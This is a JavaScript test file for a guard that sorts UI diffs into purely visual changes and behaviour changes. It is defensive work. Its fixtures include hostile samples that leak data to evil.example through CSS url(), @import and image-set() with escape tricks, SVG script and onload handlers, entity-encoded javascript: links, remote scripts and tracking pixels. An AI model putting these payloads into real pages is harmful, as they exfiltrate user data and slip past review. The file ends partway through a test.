// node --test toolkit/tests/guard.test.mjs — the design-only guard's verdicts on small diffs.
import { test } from "node:test";
import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { chmodSync, mkdirSync, mkdtempSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { fileURLToPath } from "node:url";
import { compare, classifyPath, judge, judgeIgnored, newImportTargets, parseRawDiff } from "../lib/guard.mjs";

const DESIGN = fileURLToPath(new URL("../bin/design.mjs", import.meta.url));

const profile = {
  boundary: {
    allow: ["src/**/components/**", "src/**/views/**", "src/components/**", "src/**/*.css"],
    deny: ["src/**/hooks/**", "src/**/api/**", "src/**/store/**", "src/**/lib/**"],
    global_styles: ["src/App.css"],
    presentational_imports: ["^@carbon/icons-react$", "^@/components/ui/", "^@/lib/utils$"],
    aliases: { "@/": "src/" },
  },
};
const FILE = "src/modules/agents/components/agent-list.tsx";

const BASE = `
import { cn } from "@/lib/utils";
import { Button } from "@/components/ui/button";
import { TrashCan } from "@carbon/icons-react";
import { useDeleteAgent } from "../hooks/use-delete-agent.js";

export function AgentList({ agents }: { agents: Agent[] }) {
  const del = useDeleteAgent();
  if (!agents.length) return <p className="text-muted">No agents yet.</p>;
  return (
    <ul className={cn("divide-y", "border")}>
      {agents.map((a) => (
        <li key={a.id} className="flex gap-2 p-2">
          <span>{a.name}</span>
          <Button variant="ghost" onClick={() => del.mutate(a.id)}><TrashCan /> Delete</Button>
        </li>
      ))}
    </ul>
  );
}
`;

const verdict = (head, base = BASE) => compare(base, head, FILE, profile);

test("restyling and rewording is only the look", () => {
  const head = BASE.replace('"divide-y", "border"', '"divide-y rounded-lg", "border-2"').replace("No agents yet.", "Nothing here yet").replace("> Delete<", "> Remove<");
  assert.equal(verdict(head).verdict, "ok");
});

test("moving the delete button before the name is only the look", () => {
  const head = BASE.replace(
    `<span>{a.name}</span>
          <Button variant="ghost" onClick={() => del.mutate(a.id)}><TrashCan /> Delete</Button>`,
    `<Button variant="outline" onClick={() => del.mutate(a.id)}><TrashCan /></Button>
          <div className="grow"><span className="font-medium">{a.name}</span></div>`);
  assert.equal(verdict(head).verdict, "ok", JSON.stringify(verdict(head)));
});

test("a collapsible section is view-only state", () => {
  const head = BASE
    .replace('import { cn } from "@/lib/utils";', 'import { useState } from "react";\nimport { cn } from "@/lib/utils";')
    .replace("const del = useDeleteAgent();", "const del = useDeleteAgent();\n  const [open, setOpen] = useState(false);")
    .replace("<ul className", '<><button onClick={() => setOpen(!open)}>Agents</button>{open && <ul className')
    .replace("</ul>\n  );", "</ul>}</>\n  );");
  const r = verdict(head);
  assert.equal(r.verdict, "ui-state", JSON.stringify(r));
});

test("calling a new mutation is a behaviour change", () => {
  const head = BASE
    .replace('import { useDeleteAgent } from "../hooks/use-delete-agent.js";', 'import { useDeleteAgent } from "../hooks/use-delete-agent.js";\nimport { useArchiveAgent } from "../hooks/use-archive-agent.js";')
    .replace("const del = useDeleteAgent();", "const del = useDeleteAgent();\n  const archive = useArchiveAgent();")
    .replace("<TrashCan /> Delete</Button>", "<TrashCan /> Delete</Button><Button onClick={() => archive.mutate(a.id)}>Archive</Button>");
  const r = verdict(head);
  assert.equal(r.verdict, "logic");
  assert.ok(r.issues.some((i) => /useArchiveAgent/.test(i)));
});

test("changing a condition is a behaviour change", () => {
  const r = verdict(BASE.replace("if (!agents.length)", "if (agents.length < 2)"));
  assert.equal(r.verdict, "logic");
});

test("dropping the delete button takes something away", () => {
  const r = verdict(BASE.replace(`<Button variant="ghost" onClick={() => del.mutate(a.id)}><TrashCan /> Delete</Button>`, ""));
  assert.notEqual(r.verdict, "ok");
  assert.ok(r.issues.some((i) => /no longer offers: onClick/.test(i)), JSON.stringify(r));
});

test("paths outside the allow list are refused before any code is read", () => {
  assert.equal(classifyPath("src/modules/agents/hooks/use-delete-agent.ts", profile).verdict, "denied");
  assert.equal(classifyPath("src/server/index.ts", profile).verdict, "denied");
  assert.equal(classifyPath("src/App.css", { boundary: { ...profile.boundary, allow: [...profile.boundary.allow, "src/App.css"] } }).verdict, "global");
});

test("a new presentational component file passes, a judged diff with a hook does not", () => {
  const card = `import { cn } from "@/lib/utils";\nexport function EmptyHint({ title }: { title: string }) {\n  return <div className={cn("p-4")}>{title}</div>;\n}\n`;
  const files = { [`${FILE}`]: [BASE, BASE.replace("No agents yet.", "Nothing yet")], "src/modules/agents/components/empty-hint.tsx": [null, card], "src/modules/agents/hooks/x.ts": ["a", "b"] };
  const changes = Object.entries(files).map(([path, [b]]) => ({ path, status: b === null ? "A" : "M" }));
  const r = judge(changes, profile, (side, p) => files[p][side === "base" ? 0 : 1]);
  assert.equal(r.ok, false);
  assert.deepEqual(r.files.map((f) => f.verdict), ["ok", "ui-state", "denied"]);
});

// Bypasses an independent review found; each must stay a behaviour change.
const notLook = (head, why) => {
  const r = verdict(head);
  assert.ok(!["ok", "ui-state"].includes(r.verdict), `${why}: ${JSON.stringify(r)}`);
};

test("an expression in a class or a style that acts is behaviour", () => {
  notLook(BASE.replace('<li key={a.id} className="flex gap-2 p-2">', '<li key={a.id} className={(del.mutate(a.id), "flex")}>'), "a call in className");
  notLook(BASE.replace('<li key={a.id} className="flex gap-2 p-2">', '<li key={a.id} data-x={() => del.mutate(a.id)}>'), "a handler hidden in data-*");
});

test("new markup that calls, decides on data, or shows new data is behaviour", () => {
  notLook(BASE.replace("<span>{a.name}</span>", "<span>{a.name}</span>{del.mutate(a.id)}"), "a call as a child");
  notLook(BASE.replace("</ul>\n  );", "</ul>\n  );").replace("<span>{a.name}</span>", "<span>{a.name}</span>{!a.isAdmin && <TrashCan />}"), "a new condition");
  notLook(BASE.replace("<span>{a.name}</span>", "<span>{a.name}</span><code>{a.apiToken}</code>"), "a field not shown before");
  notLook(BASE.replace("<span>{a.name}</span>", '<span dangerouslySetInnerHTML={{ __html: a.name }} />'), "raw HTML");
  notLook(BASE.replace("<Button variant=\"ghost\"", '<Button type="submit" variant="ghost"'), "a new submit");
});

test("addresses, methods and statuses in code keep their text", () => {
  const withConst = BASE.replace("export function AgentList", 'const ENDPOINT = "/api/agents";\nexport function AgentList');
  assert.equal(compare(withConst, withConst.replace('"/api/agents"', '"/api/admin/wipe"'), FILE, profile).verdict, "logic");
  const withLink = BASE.replace("<span>{a.name}</span>", '<Link to={"/agents"}>{a.name}</Link>');
  assert.equal(compare(withLink, withLink.replace('to={"/agents"}', 'to={"/admin"}'), FILE, profile).verdict, "logic");
});

test("statement order matters", () => {
  const head = BASE.replace("  if (!agents.length) return <p className=\"text-muted\">No agents yet.</p>;\n", "")
    .replace("    </ul>\n  );\n}", "    </ul>\n  );\n  if (!agents.length) return <p className=\"text-muted\">No agents yet.</p>;\n}");
  assert.equal(verdict(head).verdict, "logic");
});

test("a callback parameter is not a free pass, a new component cannot smuggle an action", () => {
  const head = BASE
    .replace('import { cn } from "@/lib/utils";', 'import { useState } from "react";\nimport { cn } from "@/lib/utils";')
    .replace("const del = useDeleteAgent();", "const del = useDeleteAgent();\n  const [o, setO] = useState(false);")
    .replace("<span>{a.name}</span>", "<span onClick={(e) => { setO(!o); e.currentTarget.form.requestSubmit(); }}>{a.name}</span>");
  notLook(head, "event parameter");
  const quick = BASE.replace("export function AgentList", "function Quick({ run }: { run: () => void }) {\n  return <button onClick={run}>Go</button>;\n}\nexport function AgentList")
    .replace("<span>{a.name}</span>", "<span>{a.name}</span><Quick run={() => del.mutate(a.id)} />");
  notLook(quick, "a prop that is not on*");
});

test("a rename out of a denied folder is denied", () => {
  const r = judge([{ path: "src/modules/agents/components/auth.ts", oldPath: "src/modules/agents/api/auth.ts", status: "M" }], profile, () => "export const a = 1;\n");
  assert.equal(r.files[0].verdict, "denied");
});

test("rewording copy in a template child stays the look", () => {
  const b = BASE.replace("<span>{a.name}</span>", "<span>{`${a.name} agent`}</span>");
  assert.equal(compare(b, b.replace("agent`}", "assistant`}"), FILE, profile).verdict, "ok");
  const c = BASE.replace("export function AgentList", "const rowClass = `flex ${\"gap-2\"}`;\nexport function AgentList");
  assert.equal(compare(c, c.replace('"gap-2"', '"gap-3"'), FILE, profile).verdict, "ok");
});

test("code no adapter reads is denied, even on allow_other", () => {
  const profile = { boundary: { allow: ["web/**"], allow_other: ["web/**"] } };
  assert.equal(classifyPath("web/src/Panel.vue", profile).verdict, "denied");
  assert.equal(classifyPath("web/scripts/build.py", profile).verdict, "denied");
  assert.equal(classifyPath("web/src/notes.md", profile).verdict, "ok");
});

// Bypasses of the 1.69.0 review: each one now fails closed.
const logicFrom = (base, head, why) => { const r = compare(base, head, FILE, profile); assert.equal(r.verdict, "logic", `${why}: ${JSON.stringify(r)}`); };

test("(a) a literal on an attribute outside the presentational list is behaviour", () => {
  const add = (el) => logicFrom(BASE, BASE.replace("<span>{a.name}</span>", `<span>{a.name}</span>${el}`), el);
  add('<iframe srcDoc="<script>fetch(1)</script>" />');
  add('<script src="https://cdn.example/x.js" />');
  add('<img src="https://tracker.example/p.gif" alt="" />');
  add('<img src="/api/agents/wipe" alt="" />');
  add('<a href="#top" ping="https://tracker.example">Top</a>');
  add('<meta httpEquiv="refresh" content="0;url=https://evil.example" />');
  add('<object data="/x.swf" />');
  logicFrom(BASE, BASE.replace('<Button variant="ghost"', '<Button formMethod="post" variant="ghost"'), "formMethod");
  logicFrom(BASE, BASE.replace('<Button variant="ghost"', '<Button rel="opener" variant="ghost"'), "rel");
});

test("(a) a bare noValidate, formNoValidate, inert or disabled is behaviour; a button with no type in a form submits", () => {
  const form = BASE.replace("<ul className", '<form action="/agents" className="p-2"><input name="q" /></form>\n    <ul className');
  for (const attr of ["noValidate", "inert"]) logicFrom(form, form.replace('<form action="/agents"', `<form ${attr} action="/agents"`), attr);
  logicFrom(form, form.replace('<input name="q" />', '<input name="q" disabled />'), "disabled");
  logicFrom(form, form.replace('<input name="q" />', '<input name="q" formNoValidate />'), "formNoValidate");
  logicFrom(form, form.replace('<input name="q" />', '<input name="q" /><button className="sr-only">Go</button>'), "implicit submit");
  // type="button" only stops a submit: a disclosure button inside the form stays view state.
  const disclosure = form.replace('import { cn }', 'import { useState } from "react";\nimport { cn }').replace("const del = useDeleteAgent();", "const del = useDeleteAgent();\n  const [open, setOpen] = useState(false);")
    .replace('<input name="q" />', '<input name="q" /><button type="button" onClick={() => setOpen(!open)}>More</button>');
  assert.equal(compare(form, disclosure, FILE, profile).verdict, "ui-state", JSON.stringify(compare(form, disclosure, FILE, profile)));
});

test("(a) a fixed local image and inline icon geometry stay the look", () => {
  const img = BASE.replace("<span>{a.name}</span>", '<img src="/img/agent.png" alt="" className="h-4" /><svg viewBox="0 0 24 24" fill="none"><path d="M1 1h4" strokeWidth={2} /></svg><span>{a.name}</span>');
  const head = img.replace("/img/agent.png", "/img/agent@2x.webp").replace('fill="none"', 'fill="currentColor"').replace("M1 1h4", "M2 2h8").replace("strokeWidth={2}", "strokeWidth={1.5}");
  const r = compare(img, head, FILE, profile);
  assert.equal(r.verdict, "ok", JSON.stringify(r));
});

test("(b) what a style or a title reads must be on the screen; a remote url in a style is behaviour", () => {
  const li = '<li key={a.id} className="flex gap-2 p-2">';
  notLook(BASE.replace(li, '<li key={a.id} className="flex gap-2 p-2" title={a.apiToken}>'), "title leaks a field");
  notLook(BASE.replace(li, "<li key={a.id} className=\"flex\" style={{ backgroundImage: `url(https://evil.example/?t=${a.name})` }}>"), "a remote url in a style");
  notLook(BASE.replace(li, '<li key={a.id} style={{ backgroundImage: "url(//evil.example/p.gif)" }}>'), "a protocol-relative url");
  const ok = BASE.replace(li, '<li key={a.id} className={cn("flex gap-2", a.name.length > 20 && "text-sm")} style={{ minWidth: 40, backgroundImage: "url(/img/bg.png)" }}>');
  assert.equal(verdict(ok).verdict, "ok", JSON.stringify(verdict(ok)));
});

test("(c) a tagged template is a call", () => {
  notLook(BASE.replace("<span>{a.name}</span>", "<span>{a.name}</span>{del.mutate``}"), "tagged template child");
  notLook(BASE.replace('<li key={a.id} className="flex gap-2 p-2">', "<li key={a.id} className={del.mutate`x`}>"), "tagged template in a class");
});

const BAR = `
import { Button } from "@/components/ui/button";
import { DeleteAll } from "./delete-all";
export function Toolbar({ isAdmin, onCancel, onDelete }: Props) {
  return (
    <div className="flex">
      <Button onClick={onCancel}>Cancel</Button>
      <Button onClick={onDelete}>Delete</Button>
      {isAdmin ? <Button onClick={onDelete}>Delete all</Button> : <span>Read only</span>}
      {isAdmin && <DeleteAll />}
    </div>
  );
}
`;

test("(d) an action keeps its place: swaps, branch swaps, moves out of a condition and copies are behaviour", () => {
  logicFrom(BAR, BAR.replace("onClick={onCancel}>Cancel", "onClick={onDelete}>Cancel").replace("<Button onClick={onDelete}>Delete</Button>", "<Button onClick={onCancel}>Delete</Button>"), "swapped handlers");
  logicFrom(BAR, BAR.replace("{isAdmin ? <Button onClick={onDelete}>Delete all</Button> : <span>Read only</span>}", "{isAdmin ? <span>Read only</span> : <Button onClick={onDelete}>Delete all</Button>}"), "swapped branches");
  logicFrom(BAR, BAR.replace("{isAdmin && <DeleteAll />}", "<DeleteAll />"), "out of its condition");
  logicFrom(BAR, BAR.replace("<Button onClick={onDelete}>Delete</Button>", "<Button onClick={onDelete}>Delete</Button><Button onClick={onDelete}>Remove</Button>"), "offered twice");
});

test("(d) reordering, rewording and wrapping actions stays the look", () => {
  const head = BAR.replace("<Button onClick={onCancel}>Cancel</Button>\n      <Button onClick={onDelete}>Delete</Button>", '<div className="flex gap-2"><Button onClick={onDelete}>Delete</Button>\n      <Button onClick={onCancel}>Back</Button></div>');
  const r = compare(BAR, head, FILE, profile);
  assert.equal(r.verdict, "ok", JSON.stringify(r));
});

test("(e) view-only names belong to their function", () => {
  const base = `
import { useState } from "react";
import { logout } from "../api/session";
export function Menu({ user }: Props) {
  const bye = () => logout();
  return <nav><span>{user.name}</span><button onClick={bye}>Sign out</button></nav>;
}
`;
  logicFrom(base, base.replace("export function Menu", "function Toggle() {\n  const [logout, setLogout] = useState(false);\n  return <i>{String(logout)}</i>;\n}\nexport function Menu")
    .replace("<span>{user.name}</span>", "<span onClick={logout}>{user.name}</span>"), "state of another function");
  logicFrom(base, base.replace("export function Menu", "function Chip({ logout }: { logout: boolean }) {\n  return <i>{String(logout)}</i>;\n}\nexport function Menu")
    .replace("<span>{user.name}</span>", "<span onClick={logout}>{user.name}</span>"), "a parameter of another component");
});

test("(f) rendering a component that may act, in a new place, is behaviour; a new presentational one is not", () => {
  const icons = 'import { TrashCan } from "@carbon/icons-react";';
  notLook(BASE.replace(icons, `${icons}\nimport { DeleteProjectButton } from "./delete-project-button";`).replace("<span>{a.name}</span>", "<span>{a.name}</span><DeleteProjectButton />"), "an imported action component");
  const badge = 'export function Badge({ text }: { text: string }) {\n  return <b className="rounded px-1">{text}</b>;\n}\n';
  const withBadge = BASE.replace(icons, `${icons}\nimport { Badge } from "./badge";`).replace("<span>{a.name}</span>", "<span>{a.name}</span><Badge text={a.name} />");
  const files = { [FILE]: [BASE, withBadge], "src/modules/agents/components/badge.tsx": [null, badge] };
  const r = judge(Object.entries(files).map(([path, [b]]) => ({ path, status: b === null ? "A" : "M" })), profile, (side, p) => files[p][side === "base" ? 0 : 1]);
  assert.equal(r.ok, true, JSON.stringify(r));
});

test("(g) ignored files: build folders only at the root, the UI folder or outside the UI paths; never one the diff imports", () => {
  const p = { style: { ui_dir: "web" }, boundary: { allow: ["web/src/**/components/**"], ignored_ok: ["web/src/gen/**"], aliases: { "@/": "web/src/" } } };
  const entries = ["build/", "web/dist/", "node_modules/", "web/node_modules/", "packages/x/dist/", "npm-debug.log", "web/src/gen/",
    "web/src/components/build/", "web/src/components/node_modules/", "web/src/components/x.log", ".env.local", "web/src/components/Evil.tsx"];
  assert.deepEqual(judgeIgnored(entries, p).map((f) => f.path), ["web/src/components/build/", "web/src/components/node_modules/", "web/src/components/x.log", ".env.local", "web/src/components/Evil.tsx"]);
  const file = "web/src/components/list.tsx";
  const src = { base: "export const L = () => <ul />;\n", head: 'import Evil from "./build/Evil";\nimport { q } from "@/gen/q";\nexport const L = () => <ul />;\n' };
  const targets = newImportTargets([{ path: file, status: "M" }], p, (side) => src[side]);
  const loose = { ...p, boundary: { ...p.boundary, allow: ["nothing/**"] } };
  assert.deepEqual(judgeIgnored(["packages/x/dist/", "web/src/gen/", "web/src/components/build/"], loose, targets).map((f) => f.path), ["web/src/gen/", "web/src/components/build/"]);
});

test("(h) style sheets, SVGs and links: remote loads, disabled or hidden controls, script and symlinks are behaviour", () => {
  const css = (head, base = ".a { color: red }\n") => judge([{ path: "src/components/x.css", status: "M" }], profile, (side) => (side === "base" ? base : head)).files[0].verdict;
  assert.equal(css('@import url("https://evil.example/x.css");\n.a { color: red }'), "logic");
  assert.equal(css(".a { background: url(https://evil.example/p.gif) }"), "logic");
  assert.equal(css(".btn { pointer-events: none }"), "logic");
  assert.equal(css(".bar button { display: none }"), "logic");
  assert.equal(css(".bar [role=button] { visibility: hidden }"), "logic");
  assert.equal(css(".card { display: none } .a { background: url(/img/bg.png); color: blue }"), "style");
  const remote = '@import url("https://fonts.example/x.css");\n';
  assert.equal(css(`${remote}.b { color: blue }`, `${remote}.a { color: red }`), "style", "a remote import the base already had is not new");
  const svg = (head) => judge([{ path: "public/icon.svg", status: "A" }], { boundary: { allow: ["public/**"] } }, () => head).files[0].verdict;
  assert.equal(svg('<svg xmlns="http://www.w3.org/2000/svg"><path d="M0 0"/></svg>'), "asset");
  assert.equal(svg("<svg><script>alert(1)</script></svg>"), "logic");
  assert.equal(svg('<svg onload="fetch(1)"></svg>'), "logic");
  assert.equal(svg("<svg><foreignObject><div/></foreignObject></svg>"), "logic");
  assert.equal(judge([{ path: "src/components/x.tsx", status: "A", mode: "120000", oldMode: "000000" }], profile, () => "x").files[0].verdict, "logic");
});

// Round 2 of the 1.69.0 review: the browser's reading of an address, prefixed SVG
// elements, inline styles, and a failing test for every branch of the guard.
const cssVerdict = (head, base = ".a { color: red }\n") => judge([{ path: "src/components/x.css", status: "M" }], profile, (side) => (side === "base" ? base : head)).files[0].verdict;
const svgVerdict = (head) => judge([{ path: "public/icon.svg", status: "A" }], { boundary: { allow: ["public/**"] } }, () => head).files[0].verdict;

test("(i) a style sheet is read as the browser reads it: escapes, comments, case and other spellings of an address", () => {
  for (const c of ['@import"https://evil.example/x.css";', '@import/**/"https://evil.example/x.css";', '@import url( https://evil.example/x.css );', "@import x;",
    ".a { background: url(/\\/evil.example/x.gif) }", ".a { background: url(\\2f \\2f evil.example/x.gif) }", ".a { background: u\\72l(https://evil.example/x.gif) }",
    '.a { background: image-set("https://evil.example/x.gif" 1x) }', '.a { background: URL( "//evil.example/x.gif" ) }', ".a { background: url(data:text/html,x) }",
    ".a { cursor: url(/img/x.png?track=1), auto }", ".a { background: url(/\\9 /evil.example/x.gif) }", '.a { background: url("/\\5c evil.example/x.gif") }',
    ".a { background: url(/img/a b.png) }"]) assert.equal(cssVerdict(c), "logic", c);
  for (const c of [".a { -moz-binding: url(x.xml#b) }", ".a { behavior: url(x.htc) }", ".a { width: expression(alert(1)) }", ".a { width: \\65xpression(alert(1)) }"]) assert.equal(cssVerdict(c), "logic", c);
  for (const c of [".b { @apply pointer-events-none }", ".bar button { @apply hidden }", ".btn { p\\6f inter-events: none }", 'button { content: "{"; display: none }']) assert.equal(cssVerdict(c), "logic", c);
  for (const c of ['.a { background: url("data:image/png;base64,AAA=") }', ".a { fill: url(#g) }", '@import "./base.css";\n.a { color: blue }', ".a { background: url( /img/bg.png ) }",
    ".a { /* url(https://evil.example/x.gif) */ color: blue }", ".a { background: URL(/img/bg.png) }", ".a { background: url(\\2f img\\2f bg.png) }"]) assert.equal(cssVerdict(c), "style", c);
});

test("(j) an SVG is read by local names and decoded values: prefixed script, embedded documents, outside links, entities", () => {
  for (const c of ['<svg xmlns="http://www.w3.org/2000/svg"><s:script xmlns:s="http://www.w3.org/2000/svg">document.title=1</s:script></svg>', "<svg><h:iframe/></svg>", '<svg><embed src="x.swf"/></svg>', "<svg><object/></svg>",
    '<svg><image href="/\\evil.example/p.png"/></svg>', '<svg><image xlink:href="https://evil.example/p.png"/></svg>', '<svg><a href="&#106;avascript:alert(1)">x</a></svg>', '<svg><a href="java&#x09;script:alert(1)">x</a></svg>',
    '<svg><set attributeName="href" to="https://evil.example/p.png"/></svg>', '<!DOCTYPE svg [<!ENTITY x "y">]><svg>&x;</svg>', '<?xml-stylesheet href="x.css"?><svg/>',
    '<svg><style><![CDATA[@import "https://evil.example/x.css";]]></style></svg>', '<svg><path fill="url(https://evil.example/f.svg#g)"/></svg>', '<svg><path style="background:url(//evil.example/p.gif)"/></svg>',
    "<svg><embed/></svg>", '<?xml-stylesheet type="text/css" href="#s"?><svg/>', "<svg><text>javascript:x</text></svg>", '<svg><path data-x="&#106;avascript:x"/></svg>',
    '<svg><set attributeName="href" to="&#x68;ttps://evil.example/p.png"/></svg>']) assert.equal(svgVerdict(c), "logic", c);
  assert.equal(svgVerdict('<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><defs><path id="i" d="M0 0"/></defs><use href="#i"/><path fill="url(#i)"/><image href="data:image/png;base64,AAA="/></svg>'), "asset");
});

test("(k) markup: a backslash image path, <portal>, a <style> element, markup in an attribute", () => {
  const add = (el) => logicFrom(BASE, BASE.replace("<span>{a.name}</span>", `<span>{a.name}</span>${el}`), el);
  add('<img src="/\\evil.example/p.png" alt="" />');
  add('<img src="/img/a.png?x=1" alt="" />');
  add("<portal />");
  add('<style>{"@import \\"https://evil.example/x.css\\";"}</style>');
  add("<style>@import url(&#47;&#47;evil.example/x.css);</style>");
  add("<style>{`.a { color: ${a.name} }`}</style>");
  add("<abbr tip=<iframe /> />");
  add("<span title=<iframe /> />");
  const ok = (el) => { const r = verdict(BASE.replace("<span>{a.name}</span>", `<span>{a.name}</span>${el}`)); assert.equal(r.verdict, "ok", `${el}: ${JSON.stringify(r)}`); };
  ok('<img src="data:image/png;base64,AAAA" alt="" />');
  ok('<style>{".a { color: red }"}</style>');
  ok("<style>@import url(&#47;css&#47;x.css);</style>");
});

test("(l) an inline style gets the style-sheet test: it may not hide or disable a control, or load from elsewhere", () => {
  const btn = '<Button variant="ghost" onClick={() => del.mutate(a.id)}>';
  const on = (style) => BASE.replace(btn, `<Button variant="ghost" style={${style}} onClick={() => del.mutate(a.id)}>`);
  for (const s of ['{ pointerEvents: "none" }', '{ display: "none" }', "{ visibility: a.name }", '{ ...{ display: "none" } }', "HIDE"]) logicFrom(BASE.replace("export function AgentList", 'const HIDE = { display: "none" };\nexport function AgentList'), on(s).replace("export function AgentList", 'const HIDE = { display: "none" };\nexport function AgentList'), s);
  const li = '<li key={a.id} className="flex gap-2 p-2">';
  const at = (style) => BASE.replace(li, `<li key={a.id} className="flex gap-2 p-2" style={${style}}>`);
  for (const s of ['{ pointerEvents: "none" }', '{ backgroundImage: "url(/\\\\/evil.example/p.gif)" }', '{ "--bg": "url(https://evil.example/x.gif)" }', '{ WebkitMaskImage: "url(https://evil.example/m.svg)" }', "{ backgroundImage: a.name }"]) logicFrom(BASE, at(s), s);
  for (const s of ['{ display: "none" }', "{ minWidth: 40, color: a.name }"]) assert.equal(verdict(at(s)).verdict, "ok", s);
  // A control without a handler, native or a component, is still a control.
  for (const el of ['<button style={{ display: "none" }}>More</button>', '<Button variant="ghost" style={{ visibility: "hidden" }}>More</Button>']) logicFrom(BASE, BASE.replace("<span>{a.name}</span>", `<span>{a.name}</span>${el}`), el);
});

test("(m) decorators, dynamic imports, export … from and literal consts", () => {
  notLook(BASE.replace('<li key={a.id} className="flex gap-2 p-2">', "<li key={a.id} data-x={@del.mutate class {}}>"), "a decorator calls");
  const p = { boundary: { allow: ["web/src/**/components/**"] } };
  const src = { base: "export const L = () => <ul />;\n", head: 'export { x } from "./build/a";\nconst m = () => import("./build/b");\nconst r = require("./build/c");\nexport const L = () => <ul />;\n' };
  assert.deepEqual(newImportTargets([{ path: "web/src/components/list.tsx", status: "M" }], p, (side) => src[side]).sort(), ["web/src/components/build/a", "web/src/components/build/b", "web/src/components/build/c"]);
  const withConst = BASE.replace("export function AgentList", "const GAP = 8;\nexport function AgentList");
  const r = compare(withConst, withConst.replace('<li key={a.id} className="flex gap-2 p-2">', '<li key={a.id} className="flex p-2" style={{ gap: GAP }}>'), FILE, profile);
  assert.equal(r.verdict, "ok", JSON.stringify(r));
});

test("(n) a symbolic link turned into a file, an unreadable file, and the raw diff", () => {
  assert.equal(judge([{ path: "src/components/x.tsx", status: "M", mode: "100644", oldMode: "120000" }], profile, () => "export const x = 1;\n").files[0].verdict, "logic");
  assert.equal(judge([{ path: "src/components/x.css", status: "M" }], profile, (side) => (side === "base" ? ".a{}" : null)).files[0].verdict, "logic");
  const raw = [":100644 100644 aaa bbb R087", "src/a.tsx", "src/b.tsx", ":000000 120000 000 ccc A", "src/l.tsx", ":100644 100644 ddd eee M", "src/c.css", ""].join("\0");
  assert.deepEqual(parseRawDiff(raw), [
    { status: "M", path: "src/b.tsx", oldPath: "src/a.tsx", mode: "100644", oldMode: "100644" },
    { status: "A", path: "src/l.tsx", mode: "120000", oldMode: "000000" },
    { status: "M", path: "src/c.css", mode: "100644", oldMode: "100644" },
  ]);
});

test("(o) design guard on a git repository: a rename is judged by both paths, a symbolic link is refused", () => {
  const dir = mkdtempSync(join(tmpdir(), "dd-guard-")), prof = join(mkdtempSync(join(tmpdir(), "dd-guard-p-")), "profile.json");
  const git = (...a) => { const r = spawnSync("git", ["-C", dir, "-c", "user.email=guard@example.com", "-c", "user.name=guard", "-c", "commit.gpgsign=false", ...a], { encoding: "utf8" }); assert.equal(r.status, 0, r.stderr); return r.stdout; };
  git("init", "-q");
  mkdirSync(join(dir, "src/components"), { recursive: true });
  mkdirSync(join(dir, "src/api"), { recursive: true });
  writeFileSync(join(dir, "src/components/a.tsx"), 'export const A = () => <p className="p-2">Hi</p>;\n');
  writeFileSync(join(dir, "src/api/key.ts"), 'export const KEY = "k";\n');
  writeFileSync(prof, JSON.stringify({ boundary: { allow: ["src/components/**"] } }));
  git("add", "-A"); git("commit", "-qm", "base");
  const base = git("rev-parse", "HEAD").trim();
  const guard = () => { const r = spawnSync(process.execPath, [DESIGN, "guard", dir, "--base", base, "--profile", prof], { encoding: "utf8" }); return { status: r.status, out: JSON.parse(r.stdout) }; };
  git("mv", "src/components/a.tsx", "src/components/hello.tsx");
  let r = guard();
  assert.equal(r.status, 0, JSON.stringify(r.out));
  assert.deepEqual(r.out.files.map((f) => [f.path, f.verdict]), [["src/components/hello.tsx", "ok"]]);
  git("mv", "src/api/key.ts", "src/components/key.ts");
  symlinkSync("../api/key.ts", join(dir, "src/components/link.tsx"));
  r = guard();
  assert.equal(r.status, 1, JSON.stringify(r.out));
  const by = Object.fromEntries(r.out.files.map((f) => [f.path, f.verdict]));
  assert.equal(by["src/components/key.ts"], "denied");
  assert.equal(by["src/components/link.tsx"], "logic");
});

// Round 3 of the 1.69.0 review: start tags in an SVG, strings in custom properties, and a
// failing fixture for each name and branch the review named.
test("(p) an SVG's attributes are read only inside start tags; comments, CDATA, PIs and text hold none", () => {
  for (const c of ['<svg><!-- a=" --><image href="http://evil.example/p.png"/></svg>', "<svg><text>a=\"</text><rect onclick=\"document.title='pwn'\"/></svg>",
    '<svg><!--> <image href="https://evil.example/p.png"/> --></svg>', '<?pi a="?><svg><image href="https://evil.example/p.png"/></svg>',
    '<svg><desc><![CDATA[ a=" ]]></desc><image href="https://evil.example/p.png"/></svg>', "<svg><image href=https://evil.example/p.png /></svg>"]) assert.equal(svgVerdict(c), "logic", c);
  assert.equal(svgVerdict('<svg><!-- href="https://evil.example/p.png" --><title>a="b"</title><path d="M0 0"/></svg>'), "asset");
});

test("(q) a string in a custom property must be a local address: var() can carry it into image-set()", () => {
  assert.equal(cssVerdict('.a { --u: "https://evil.example/a.gif" } .b { background: image-set(var(--u) 1x) }'), "logic");
  assert.equal(cssVerdict(".a { --u: url(https://evil.example/a.gif) }"), "logic");
  assert.equal(cssVerdict('.a { --font: "Inter"; color: red }'), "style");
  const li = '<li key={a.id} className="flex gap-2 p-2">';
  const s = `{ "--u": '"https://evil.example/a.gif"', background: "image-set(var(--u) 1x)" }`;
  logicFrom(BASE, BASE.replace(li, `<li key={a.id} className="flex gap-2 p-2" style={${s}}>`), s);
});

test("(r) every image function, src(), an empty url(), every active SVG element, a DOCTYPE subset and entities in <style>", () => {
  for (const f of ["image-set", "-webkit-image-set", "image", "cross-fade", "-webkit-cross-fade"]) assert.equal(cssVerdict(`.a { background: ${f}("https://evil.example/a.gif" 1x) }`), "logic", f);
  for (const c of ['.a { background: src("https://evil.example/a.gif") }', ".a { background: src(var(--x)) }", ".a { background: url() }"]) assert.equal(cssVerdict(c), "logic", c);
  for (const el of ["script", "foreignObject", "iframe", "frame", "embed", "object", "applet", "portal", "handler", "listener", "link", "meta", "base"]) assert.equal(svgVerdict(`<svg><${el}/></svg>`), "logic", el);
  assert.equal(svgVerdict("<!DOCTYPE svg [ ]><svg/>"), "logic");
  assert.equal(svgVerdict('<svg><style>@imp&#111;rt "https://evil.example/c.css";</style></svg>'), "logic");
});

test("(s) markup: a protocol-relative image, a remote srcSet entry, the false branch of a conditional style", () => {
  const add = (el) => logicFrom(BASE, BASE.replace("<span>{a.name}</span>", `<span>{a.name}</span>${el}`), el);
  add('<img src="//evil.example/p.png" alt="" />');
  add('<img srcSet="/img/a.png 1x, //evil.example/b.png 2x" alt="" />');
  const ok = verdict(BASE.replace("<span>{a.name}</span>", '<span>{a.name}</span><img srcSet="/img/a.png 1x, /img/a@2x.png 2x" alt="" />'));
